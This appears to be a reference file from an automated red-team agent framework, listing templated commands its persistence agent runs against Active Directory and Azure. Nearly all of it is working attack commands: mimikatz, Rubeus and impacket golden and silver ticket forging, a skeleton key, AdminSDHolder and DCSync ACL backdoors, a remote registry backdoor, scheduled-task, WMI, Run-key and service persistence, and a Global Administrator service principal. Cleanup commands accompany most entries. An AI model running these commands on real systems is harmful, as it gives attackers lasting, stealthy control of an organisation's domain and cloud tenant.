# Persistence — Tool commands reference

Templated commands the `PersistenceAgent` dispatches. Every command MUST
include a `cleanup_cmd` (the exact reverse) or be destructive-gated AND its
artefact must be revocable via vault key revocation.

Placeholders documented in
[../../discovering-environment/reference/tool-commands.md](../../discovering-environment/reference/tool-commands.md).

## Contents
- mimikatz (Pe1, Pe4, Pe5)
- rubeus golden (Pe1, offline)
- impacket-ticketer (Pe1 Linux offline)
- powerview (Pe2, Pe3, Pe10)
- damp (Pe2)
- schtasks (Pe7)
- powerlurk (Pe6)
- reg (Pe8)
- sc (Pe9)
- net (Pe10)
- aadinternals (Pe15)

## `mimikatz`  (Pe1, Pe4, Pe5)

```yaml
tool: mimikatz
opsec: loud_at_create_stealth_at_use
destructive_gate: true
commands:
  - id: golden_ticket
    cmd: |
      "kerberos::golden /user:{{ persist.username }} \
        /domain:{{ context.scope.domains[0] }} \
        /sid:{{ ad.domain_sid }} \
        /krbtgt:{{ vault.get('krbtgt_nt') }} \
        /id:500 /groups:512,513,518,519,520 \
        /ticket:{{ artifact.path }}/golden.kirbi" exit
    parser: parsers.golden_ticket
    on_success:
      - "vault.store(golden.kirbi)"
      - "attack_path[] += step persistence/golden_ticket"
      - "context.persistence_artifacts[] += golden_ticket entry"
  - id: silver_ticket
    cmd: |
      "kerberos::golden /user:Administrator \
        /domain:{{ context.scope.domains[0] }} \
        /sid:{{ ad.domain_sid }} \
        /target:{{ target.host.fqdn }} \
        /service:{{ target.spn }} \
        /rc4:{{ vault.get('target_machine_nt') }} \
        /ticket:{{ artifact.path }}/silver.kirbi" exit
    parser: parsers.silver_ticket
  - id: skeleton_key
    cmd: '"privilege::debug" "misc::skeleton" exit'
    parser: parsers.skeleton_key
    notes: "Run on DC; non-persistent across reboot."
```

## `rubeus`  (Pe1 — preferred, offline forge)

```yaml
tool: rubeus
opsec: stealth
destructive_gate: true
commands:
  - id: golden_offline
    cmd: |
      Rubeus.exe golden /rc4:{{ vault.get('krbtgt_nt') }} \
        /domain:{{ context.scope.domains[0] }} /sid:{{ ad.domain_sid }} \
        /user:{{ persist.username }} /id:500 \
        /groups:512,513,518,519,520 /nowrap \
        /outfile:{{ artifact.path }}/golden.kirbi
    parser: parsers.golden_ticket
```

## `impacket-ticketer`  (Pe1 Linux offline)

```yaml
tool: impacket-ticketer
opsec: stealth
destructive_gate: true
commands:
  - id: golden
    cmd: |
      ticketer.py -nthash {{ vault.get('krbtgt_nt') }} \
        -domain-sid {{ ad.domain_sid }} \
        -domain {{ context.scope.domains[0] }} \
        {{ persist.username }}
    parser: parsers.golden_ticket
```

## `powerview`  (Pe2, Pe3, Pe10)

```yaml
tool: powerview
opsec: stealth
destructive_gate: true
commands:
  - id: adminsdholder_genericall
    cmd: |
      Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,{{ ad.domain_dn }}' \
        -PrincipalIdentity {{ persist.controlled_principal }} \
        -Rights All -PrincipalDomain {{ context.scope.domains[0] }} -TargetDomain {{ context.scope.domains[0] }}
    parser: parsers.powerview_acl
    cleanup_cmd: |
      Remove-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,{{ ad.domain_dn }}' \
        -PrincipalIdentity {{ persist.controlled_principal }} -Rights All
  - id: dcsync_rights_grant
    cmd: |
      Add-DomainObjectAcl -TargetIdentity '{{ ad.domain_dn }}' \
        -PrincipalIdentity {{ persist.controlled_principal }} \
        -Rights DCSync
    parser: parsers.powerview_acl
    cleanup_cmd: |
      Remove-DomainObjectAcl -TargetIdentity '{{ ad.domain_dn }}' \
        -PrincipalIdentity {{ persist.controlled_principal }} -Rights DCSync
  - id: niche_priv_group_add
    cmd: "Add-DomainGroupMember -Identity 'Backup Operators' -Members {{ persist.controlled_principal }}"
    parser: parsers.powerview_group
    cleanup_cmd: "Remove-DomainGroupMember -Identity 'Backup Operators' -Members {{ persist.controlled_principal }}"
```

## `damp`  (Pe2 alt)

```yaml
tool: damp
opsec: stealth
destructive_gate: true
commands:
  - id: plant
    cmd: "Add-RemoteRegBackdoor -ComputerName {{ target.host.fqdn }} -Trustee {{ persist.controlled_principal }}"
    parser: parsers.damp
```

## `schtasks`  (Pe7)

```yaml
tool: schtasks
opsec: moderate
destructive_gate: true
commands:
  - id: onlogon
    cmd: |
      schtasks /Create /SC ONLOGON /RU SYSTEM /TN "{{ persist.task_name }}" \
        /TR "{{ payload.cmd }}" /F
    parser: parsers.schtasks
    cleanup_cmd: 'schtasks /Delete /TN "{{ persist.task_name }}" /F'
  - id: onevent
    cmd: |
      schtasks /Create /SC ONEVENT /EC Security /MO "*[System[(EventID=4624)]]" \
        /RU SYSTEM /TN "{{ persist.task_name }}" /TR "{{ payload.cmd }}" /F
    parser: parsers.schtasks
    cleanup_cmd: 'schtasks /Delete /TN "{{ persist.task_name }}" /F'
```

## `powerlurk`  (Pe6)

```yaml
tool: powerlurk
opsec: stealth
destructive_gate: true
commands:
  - id: register_logon_trigger
    cmd: |
      Register-MaliciousWmiEvent -EventName '{{ persist.event_name }}' \
        -PermanentCommand '{{ payload.cmd }}' \
        -Trigger ProcessStart -ProcessName explorer.exe
    parser: parsers.wmi_subscription
    cleanup_cmd: "Remove-WmiObject -Class __EventFilter -Filter \"Name='{{ persist.event_name }}'\""
```

## `reg`  (Pe8)

```yaml
tool: reg
opsec: moderate
destructive_gate: true
commands:
  - id: hkcu_run
    cmd: |
      reg add "HKCU/Software/Microsoft/Windows/CurrentVersion/Run" \
        /v {{ persist.value_name }} /t REG_SZ /d "{{ payload.cmd }}" /f
    parser: parsers.reg
    cleanup_cmd: |
      reg delete "HKCU/Software/Microsoft/Windows/CurrentVersion/Run" /v {{ persist.value_name }} /f
```

## `sc`  (Pe9)

```yaml
tool: sc
opsec: loud
destructive_gate: true
commands:
  - id: create_service
    cmd: |
      sc create {{ persist.service_name }} binPath= "{{ payload.binpath }}" \
        start= auto obj= LocalSystem DisplayName= "{{ persist.display_name }}"
    parser: parsers.sc
    cleanup_cmd: "sc delete {{ persist.service_name }}"
```

## `net`  (Pe10 — visible, decoy only)

```yaml
tool: net
opsec: loud
destructive_gate: true
commands:
  - id: create_user
    cmd: 'net user {{ persist.username }} "{{ persist.password }}" /add /domain'
    parser: parsers.net
    cleanup_cmd: "net user {{ persist.username }} /delete /domain"
```

## `aadinternals`  (Pe15 — hybrid Azure persistence)

```yaml
tool: aadinternals
opsec: stealth
destructive_gate: true
preconditions: ["context.scope.azure_tenant is not null"]
commands:
  - id: backdoor_sp
    cmd: 'New-AADIntServicePrincipal -DisplayName "{{ persist.sp_name }}"'
    parser: parsers.aadinternals
    cleanup_cmd: 'Remove-AADIntServicePrincipal -DisplayName "{{ persist.sp_name }}"'
  - id: add_role
    cmd: 'Add-AADIntRoleAssignment -RoleName "Global Administrator" -ServicePrincipalDisplayName "{{ persist.sp_name }}"'
    parser: parsers.aadinternals
    cleanup_cmd: 'Remove-AADIntRoleAssignment -RoleName "Global Administrator" -ServicePrincipalDisplayName "{{ persist.sp_name }}"'
```
